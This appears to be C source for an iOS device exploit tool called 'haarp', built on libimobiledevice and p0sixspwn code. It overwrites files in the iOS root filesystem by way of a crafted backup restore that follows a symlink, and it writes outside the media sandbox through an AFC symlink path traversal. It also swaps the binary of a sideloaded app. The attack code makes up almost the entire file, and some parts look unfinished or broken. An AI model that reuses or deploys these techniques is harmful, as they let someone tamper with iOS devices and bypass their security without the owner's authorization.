#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <dirent.h>

#include <signal.h>
#include <plist/plist.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/errno.h>

#include <assert.h>
#include <libimobiledevice/mobile_image_mounter.h>
#include <libimobiledevice/mobilebackup2.h>
#include <libimobiledevice/afc.h>

#include <openssl/sha.h>
#include <libimobiledevice/sbservices.h>
#include <libimobiledevice/lockdown.h>

#include <libimobiledevice/file_relay.h>
#include <libimobiledevice/diagnostics_relay.h>
#include <libimobiledevice/libimobiledevice.h>
#include <sys/mman.h>
// + some other functions from p0sixspwn

static int connected = 0;
int afc_send_directory(afc_client_t* afc, const char* local, const char* remote) {  // from BREAKOUT
    if (!local || !remote) {
        return 0;
    }
    DIR* cur_dir = opendir(local);
    if (cur_dir) {
        struct stat tst;
        struct stat fst;
        if ((stat(local, &fst) == 0) && S_ISDIR(fst.st_mode)) {
            afc_make_directory(afc, remote);
        }
        struct dirent* ep;
        while ((ep = readdir(cur_dir))) {
            if ((strcmp(ep->d_name, ".") == 0)
                || (strcmp(ep->d_name, "..") == 0)) {
                continue;
            }
            
            char *tpath = (char*) malloc(strlen(remote) + 1 + strlen(ep->d_name) + 1);
            char *fpath = (char*) malloc(strlen(local) + 1 + strlen(ep->d_name) + 1);
            if (fpath && tpath) {
                struct stat st;
                strcpy(fpath, local);
                strcat(fpath, "/");
                strcat(fpath, ep->d_name);
                
                strcpy(tpath, remote);
                strcat(tpath, "/");
                strcat(tpath, ep->d_name);
                
                if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
                    afc_send_directory(afc, fpath, tpath);
                } else {
                    
                    if (afc_send_file(afc, fpath, tpath) != 0) {
                    }
                }
                
                free(tpath);
                free(fpath);
            }
        }
        closedir(cur_dir);
    }
    return 0;
}

int opt;

int main(int argc, char** argv) {
    afc_client_t afc = NULL;
    device_t *device = NULL;
    char *uuid = NULL;
    char *product = NULL;
    char *build = NULL;
    struct lockdownd_service_descriptor desc = { 0, 0 };
    if (!uuid){
        device = device_create(NULL);
        if (!device){
            printf("We got problems\n");
            return -1;
        }
        uuid = strdup(device->uuid);
    } else {
        device = device_create(uuid);
        if (!device){
            printf("We got problems\n");
            return -1;
        }
    }
    idevice_event_subscribe(idevice_event_cb, uuid);
    printf("%s is here\n",uuid);
    lockdown_t *lockdown = lockdown_open(device);
    if (lockdown == NULL){
        printf("We got lockdown problems\n");
        device_free(device);
        return -1;
    }
    printf("Starting haarp\n");
    lockdown_get_string(lockdown, "HardwareModel", &product);
    lockdown_get_string(lockdown, "BuildVersion", &build);
    printf("Found: %s, with build %s\n", product, build);
    
    printf("Option (1/2/3): ");
    scanf("%d", &opt);
    if (opt==1) {
        printf("p0sixspwn/libimobiledevice wrapper to overwrite stuff in the iOS rootfs:\nlocalfilepath: file to write to iDevice;\nremotepath: directory to write the file in (e.g. /var/db);\nremotefilename: name of the file to overwrite\n");
        if (argc<4) {
            printf("Usage: ./1337estcode localfilepath remotepath remotefilename\n");
            return -1;
        }
        char backup_dir[1337];
        int port=0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
            printf("We got holmes problems\n");
            return -1;
        }
    
        if (lockdown_close(lockdown) !=0){
            printf("uh?");
        }
        lockdown_free(lockdown);
        lockdown = NULL;
        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (afc==NULL){
            printf("you've got no afc\n");
            return -1;
        }
        uint64_t handle=0;
        uint32_t written=0;
        if (afc_send_file(afc, "inject.txt", "/inject.txt") != AFC_E_SUCCESS ){ // /var/mobile/Media*
            printf("try again\n");
        }
        tmpnam(backup_dir);
        printf("Backing up files to %s\n", backup_dir);
        rmdir_recursive(backup_dir);
    
        backup_t *backup;
        rmdir_recursive(backup_dir);
        mkdir(backup_dir, 0755);
        char backup1[1024];
        snprintf(backup1, sizeof(backup1), "idevicebackup2 backup %s", backup_dir);
        system(backup1);
        backup = backup_open(backup_dir, uuid);
        if (!backup) {
            fprintf(stderr, "We aint got no backup \n");
            return -1;
        }
        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
            printf("Could not make folder\n");
            return -1;
        }
        if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", argv[2], 501, 501, 4) != 0) {
            printf("Could not symlink dem shits!\n");
            return -1;
        }
        char dest[64] = "Media/Recordings/.haxx/";
        strcat(dest, argv[3]);
        if (backup_add_file_from_path(backup, "MediaDomain", argv[1], dest, 0100755, 0, 0, 4) != 0) {
            printf("Could not add memes\n");
            return -1;
        }
    
        snprintf(backup1, sizeof(backup1), "idevicebackup2 restore --system --settings --reboot %s", backup_dir);
        system(backup1);
        backup_free(backup);
        while (connected) sleep(2);
        while (!connected) sleep(2);
        sleep(5);
        printf("Device connected!\n");
    } else if (opt==2) {
        int port=0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
            printf("We got problems\n");
            return -1;
        }
        if (lockdown_close(lockdown) !=0){
            printf("uh?");
        }
        lockdown_free(lockdown);
        lockdown = NULL;
        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (afc==NULL){
            printf("yaint got no afc\n");
            return -1;
        }
        if(afc_make_link(afc, 2, "../../../../../tmp", "Downloads/a/a/a/a/a/link") != AFC_E_SUCCESS){
            return -1;
        }
        if(afc_rename_path(afc, "Downloads/a/a/a/a/a/link", "tmp") != AFC_E_SUCCESS) {
            return -1;
        }
        if(afc_send_file(afc, "inject.txt", "tmp/kek") != AFC_E_SUCCESS) {
            return -1;
        }
        uint32_t *read;
        uint64_t handle=0;
      /*  if (afc_file_open(afc, "tmp/kek",AFC_FOPEN_RDONLY, &handle) != AFC_E_SUCCESS) {    read 10 bytes from tmp dir
            printf("fuk of\n");
            return -1;
        }
        char *baits = (char *) malloc(sizeof(char)*10);
        if (afc_file_read(afc, handle, baits,10,&read) != AFC_E_SUCCESS){
            fprintf(stderr, "Could not drink juice4\n");
            return -1;
        }
        if (read > 0)
            printf("Result: %s\n", baits);
        else
            printf("Couldn't read!\n");
        
        free(baits);*/
    } else if (opt == 3){
        int port=0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
            printf("We got problems\n");
            return -1;
        }
        if (lockdown_close(lockdown) !=0){
            printf("uh?");
        }
        lockdown_free(lockdown);
        lockdown = NULL;
        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (afc==NULL){
            printf("you have got no afc\n");
            return -1;
        }
        if (afc_send_directory(afc, "coolipa/x/Payload/WWDC.app","Downloads/WWDC.app") != AFC_E_SUCCESS) {
            return -1;
        }
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "ideviceinstaller -u %s -i coolipa/pkg.ipa", uuid);
        system(cmd);
        if(afc_send_file(afc, "WWDC", "Downloads/WWDC.app/WWDC") != AFC_E_SUCCESS) { // custom WWDC shabang
            return -1;
        }
        fprintf(stdout, "Job completed!\n");
    } else {
        fprintf(stderr, "?\n");
        return -1;
    }
    afc_client_free(afc);
    afc = NULL;
    device_free(device);
    return 0;
}
